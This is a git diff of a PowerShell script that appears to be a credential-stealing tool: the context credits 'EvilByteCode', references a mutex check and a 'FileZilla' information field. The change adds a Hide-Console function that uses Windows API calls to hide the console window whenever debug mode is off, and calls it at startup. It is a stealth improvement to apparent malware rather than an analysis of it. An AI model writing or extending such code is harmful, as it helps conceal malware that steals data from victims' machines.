@@ -32,6 +32,22 @@ function KDMUTEX {
         }
     }
 }
+
+
+function Hide-Console {
+    Add-Type -Name Window -Namespace Console -MemberDefinition '
+[DllImport("Kernel32.dll")]
+public static extern IntPtr GetConsoleWindow();
+
+[DllImport("user32.dll")]
+public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);
+'
+    $consolePtr = [Console.Window]::GetConsoleWindow()
+    #0 hide
+    [Console.Window]::ShowWindow($consolePtr, 0)
+}
+
+
 Add-Type -AssemblyName PresentationCore, PresentationFramework
 
 #THIS CODE WAS MADE BY EvilByteCode
@@ -1081,6 +1097,9 @@ FileZilla: $filezilla_info
 }
 
 if (CHECK_AND_PATCH -eq $true) {
+    if (-not ($debug)) {
+        Hide-Console
+    }
     KDMUTEX
     if ($debug) {
         Read-Host -Prompt "Press Enter to continue"
